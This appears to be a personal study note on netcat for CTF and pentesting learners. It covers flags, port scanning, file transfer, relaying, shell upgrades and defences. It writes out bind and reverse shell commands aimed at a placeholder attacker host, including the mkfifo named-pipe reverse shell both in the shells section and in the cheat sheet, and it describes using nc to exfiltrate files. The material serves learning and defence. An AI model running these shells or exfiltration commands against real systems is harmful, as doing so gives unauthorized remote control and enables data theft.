## What is Netcat?

Netcat (`nc`) is a command-line networking utility that reads and writes data across network connections using TCP or UDP. It is called the **"Swiss Army knife of networking"** because it can do almost anything involving raw network connections.

> [!info] Why it matters in cybersecurity Every reverse shell, bind shell, file transfer, and port scan technique you'll encounter in CTFs and real pentesting builds on the same concepts netcat uses. Understanding netcat = understanding the foundation of network exploitation.

---

## Installation

```bash
# Arch Linux
sudo pacman -S openbsd-netcat     # OpenBSD version (recommended)
# OR
sudo pacman -S gnu-netcat          # GNU version (slightly different flags)

# Debian/Ubuntu/Kali
sudo apt install netcat-openbsd

# Verify
nc -h
```

> [!warning] Two versions exist **OpenBSD netcat** and **GNU netcat** have slightly different flags. Most modern systems and CTF writeups use OpenBSD. On Arch, `openbsd-netcat` is preferred.

## Core Concept — How Netcat Works

```
┌─────────────┐         TCP/UDP         ┌─────────────┐
│   Listener  │◄────────connection───────│   Client    │
│  nc -lvnp   │                         │  nc host    │
│    4444     │◄────────data────────────►│    port     │
└─────────────┘                         └─────────────┘
```

Netcat opens a raw socket and pipes **stdin/stdout** through it. That's it. Everything else is just what you do with that pipe.

## Flag Reference

|Flag|Meaning|What it actually does|Example|
|---|---|---|---|
|`-l`|Listen mode|Instead of connecting TO someone, netcat waits and accepts an incoming connection. Think of it like picking up the phone and waiting for someone to call you, rather than dialing out.|`nc -l`|
|`-v`|Verbose output|Makes netcat print extra info about what's happening — like "connection received from 192.168.1.5". Without this flag, netcat is completely silent even when something connects. Always use it when learning.|`nc -lv`|
|`-n`|No DNS resolution|Normally netcat tries to look up hostnames via DNS (e.g. convert `google.com` → `142.250.x.x`). `-n` skips that and only accepts raw IP addresses. Makes connections faster and avoids leaving DNS lookup logs behind.|`nc -n`|
|`-p`|Specify port|Tells netcat which port number to use. Ports are like doors on a building — each service lives on a specific one (SSH=22, HTTP=80, HTTPS=443). With `-p 4444` you're saying "use door number 4444".|`nc -p 4444`|
|`-e`|Execute program|After a connection is made, netcat runs a program and pipes all input/output through the network connection. `-e /bin/bash` means "give the connecting person a bash shell". This is what makes reverse/bind shells possible. **Only available in GNU netcat, not OpenBSD.**|`nc -e /bin/bash`|
|`-c`|Execute shell|Same idea as `-e` but specifically runs a shell command string. Some versions of netcat use `-c` instead of `-e`. If `-e` doesn't work, try `-c`.|`nc -c bash`|
|`-u`|Use UDP instead of TCP|By default netcat uses TCP (reliable, confirms delivery). `-u` switches to UDP (faster, no confirmation). Some services like DNS use UDP. Useful in specific pentesting scenarios.|`nc -u`|
|`-z`|Zero-I/O mode|Connect to a port but send absolutely no data — just check if the port is open or closed and immediately disconnect. Used for port scanning. The "zero" means zero input/output.|`nc -z`|
|`-w`|Timeout (seconds)|If no connection is made within N seconds, give up and exit. Without this, netcat waits forever. `-w 3` means "if nothing connects in 3 seconds, stop trying". Useful in scripts and port scanning.|`nc -w 3`|
|`-k`|Keep alive (persistent)|Normally when a client disconnects, the listener also exits. `-k` makes the listener stay open and wait for the next connection. Useful when you want to accept multiple connections one after another.|`nc -lk`|

> [!tip] Common combo `-lvnp` is the most common listener flag combo you'll use: **l**isten, **v**erbose, **n**o-DNS, **p**ort

## Basic Usage

### 1. Simple Chat (two terminals)

```bash
# Terminal 1 — Listener
nc -lvnp 4444

# Terminal 2 — Client
nc 127.0.0.1 4444    # nc victim ipv4 port

# Now type in either terminal — text appears in the other
# Ctrl+C to close
```

### 2. Connect to a Web Server (manual HTTP)

```bash
nc google.com 80
# Then type:
GET / HTTP/1.0
Host: google.com
# Press Enter twice — you'll see raw HTML response
```

> [!note] Why this is useful This is how you manually inspect HTTP responses, check server banners, and test if a port is actually serving HTTP — all without a browser.

### 3. Banner Grabbing (recon)

```bash
# Grab what a service announces when you connect
nc -nv 192.168.1.1 22      # SSH banner
nc -nv 192.168.1.1 80      # HTTP banner
nc -nv 192.168.1.1 25      # SMTP banner
nc -nv 192.168.1.1 21      # FTP banner
```

Banner grabbing tells you: software name, version, OS hints → used for CVE lookup.

## Port Scanning with Netcat

```bash
# Scan a single port
nc -zv 192.168.1.1 80

# Scan a port range
nc -zvn 192.168.1.1 20-100

# Scan with timeout (faster)
nc -zvn -w 1 192.168.1.1 1-1024
```

> [!warning] Nmap is better for scanning Use `nmap` for real port scanning — it's faster, stealthier, and gives more info. `nc` scanning is useful when nmap isn't available (e.g. on a compromised machine).

## File Transfer

Netcat can transfer files across a network without SCP, FTP, or any other protocol.

```bash
# Receiver (runs first, opens port)
nc -lvnp 4444 > received_file.txt

# Sender (connects and sends file)
nc 192.168.1.1 4444 < file_to_send.txt

# Transfer finishes automatically when file ends
```

### Transfer a directory (with tar)

```bash
# Receiver
nc -lvnp 4444 | tar xvf -

# Sender
tar cvf - /path/to/directory | nc 192.168.1.1 4444
```

> [!info] Real-world use On a compromised machine without SCP/FTP, `nc` file transfer is one of the fastest ways to exfiltrate data or upload tools.

## Shells — The Core Pentesting Use Case

This is where netcat becomes a real hacking tool. Understanding shells is essential before HackTheBox/CTFs.

### Bind Shell vs Reverse Shell

```
BIND SHELL                          REVERSE SHELL
──────────────────────────────      ──────────────────────────────
Victim opens a port and listens     Victim connects OUT to attacker
Attacker connects IN to victim      Attacker listens for connection

Victim: nc -lvnp 4444 -e /bin/bash  Attacker: nc -lvnp 4444
Attacker: nc victim_ip 4444         Victim: nc attacker_ip 4444 -e /bin/bash

❌ Blocked by inbound firewalls      ✅ Bypasses most firewalls
   (uncommon in real attacks)           (preferred in real attacks)
```

### Bind Shell (victim listens)

```bash
# On VICTIM machine — opens shell on port 4444
nc -lvnp 4444 -e /bin/bash          # Linux
nc -lvnp 4444 -e cmd.exe            # Windows

# On ATTACKER machine — connects to get shell
nc victim_ip 4444
```

### Reverse Shell (victim connects back)

```bash
# Step 1: ATTACKER listens first
nc -lvnp 4444

# Step 2: VICTIM connects back and sends shell
nc attacker_ip 4444 -e /bin/bash    # Linux
nc attacker_ip 4444 -e cmd.exe      # Windows
```

> [!danger] Why reverse shells bypass firewalls Firewalls typically block **incoming** connections but allow **outgoing** connections (so users can browse the web). A reverse shell has the victim initiate the outgoing connection — so the firewall lets it through. This is why reverse shells are the standard in real pentesting.

### When `-e` flag is not available (OpenBSD netcat)

OpenBSD netcat removes the `-e` flag for security. Use a named pipe workaround:

```bash
# Linux reverse shell without -e flag
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc attacker_ip 4444 > /tmp/f
```

Breaking it down:

- `mkfifo /tmp/f` — creates a named pipe (FIFO)
- `cat /tmp/f` — reads from the pipe
- `| /bin/bash -i` — pipes into an interactive bash shell
- `| nc attacker_ip 4444` — sends output to attacker
- `> /tmp/f` — loops output back into pipe

## Upgrading a Netcat Shell (Important!)

Raw netcat shells are limited — no tab completion, no arrow keys, Ctrl+C kills your shell. Always upgrade:

```bash
# Method 1: Python PTY (most common)
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Then press Ctrl+Z to background
stty raw -echo; fg
export TERM=xterm
```

```bash
# Method 2: script command
script /dev/null -c bash
```

> [!tip] Obsidian link [[Shell Stabilization Techniques]] — upgrade raw shells to fully interactive TTY

# Serve a single file over HTTP once

## Persistent Listener

```bash
# Keep listening even after a client disconnects (-k flag)
nc -lvnkp 4444

# Useful for: testing multiple connections, waiting for reverse shells
```

## UDP Mode

```bash
# Listener (UDP)
nc -lvnup 4444

# Client (UDP)
nc -u 127.0.0.1 4444
```

> [!note] UDP vs TCP in pentesting DNS runs on UDP 53. Some pentesting scenarios require UDP shells when TCP is blocked. Also used for DNS tunneling attacks.

## Netcat Relay (Traffic Forwarding)

Forward traffic from one machine to another — useful for pivoting through networks:

```bash
# On middle machine (relay):
mkfifo /tmp/relay
nc -lvnp 4444 < /tmp/relay | nc target_ip 80 > /tmp/relay

# Traffic flow:
# Attacker → port 4444 on relay → port 80 on target
```

## Practical Cheat Sheet

```bash
# ─── LISTENING ───────────────────────────────────────
nc -lvnp 4444                        # Basic listener
nc -lvnkp 4444                       # Persistent listener

# ─── CONNECTING ──────────────────────────────────────
nc 192.168.1.1 4444                  # Connect to host
nc -nv 192.168.1.1 4444              # Connect verbose, no DNS

# ─── PORT SCANNING ───────────────────────────────────
nc -zvn 192.168.1.1 1-1024           # Scan port range
nc -zvn -w1 192.168.1.1 20-25        # With 1s timeout

# ─── FILE TRANSFER ───────────────────────────────────
nc -lvnp 4444 > file.txt             # Receive file
nc 192.168.1.1 4444 < file.txt       # Send file

# ─── SHELLS ──────────────────────────────────────────
# Bind shell (victim listens)
nc -lvnp 4444 -e /bin/bash

# Reverse shell (victim calls back)
nc attacker_ip 4444 -e /bin/bash

# Reverse shell without -e (OpenBSD)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc attacker_ip 4444 > /tmp/f

# ─── BANNER GRABBING ─────────────────────────────────
nc -nv 192.168.1.1 22               # SSH
nc -nv 192.168.1.1 80               # HTTP
nc -nv 192.168.1.1 21               # FTP

# ─── UPGRADE SHELL ───────────────────────────────────
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg → export TERM=xterm
```

## Connection to Black Hat Python

The BHP "Replacing Netcat" chapter (Chapter 2) builds a Python tool that replicates netcat's core features using raw sockets. Here's how BHP maps to real netcat:

|BHP Code|Real netcat equivalent|
|---|---|
|`socket.socket()` + `bind()` + `listen()`|`nc -lvnp 4444`|
|`socket.connect()`|`nc host port`|
|`subprocess.run()` on received data|`nc -e /bin/bash`|
|Reading file + `socket.send()`|`nc host port < file`|
|`socket.recv()` + writing to file|`nc -lvnp 4444 > file`|
|Threading for simultaneous I/O|How netcat handles full-duplex comms|

> [!tip] Key insight from BHP Once you've built the replacement, you understand that **netcat is just a socket with stdin/stdout piped through it**. Everything else — shells, file transfers, relays — is just creative use of that one primitive.

## Alternatives to Netcat

|Tool|Why use it over nc|
|---|---|
|`ncat` (Nmap's version)|SSL support, IPv6, better scripting|
|`socat`|More powerful, SSL, full duplex, serial ports|
|`pwncat`|Auto-upgrades shell, file transfer built-in, great for CTFs|
|Python `socket` (BHP)|When nc isn't on the target machine|
|`busybox nc`|Minimal environments (containers, embedded)|

## Security Defenses Against Netcat

Understanding attacks from the defender side:

- **IDS/IPS signatures** detect known netcat traffic patterns
- **Egress filtering** — block outbound connections on unexpected ports
- **Application whitelisting** — prevent `nc` from running
- **Network monitoring** — alert on raw TCP connections with no protocol
- **Firewall rules** — restrict which processes can open outbound sockets
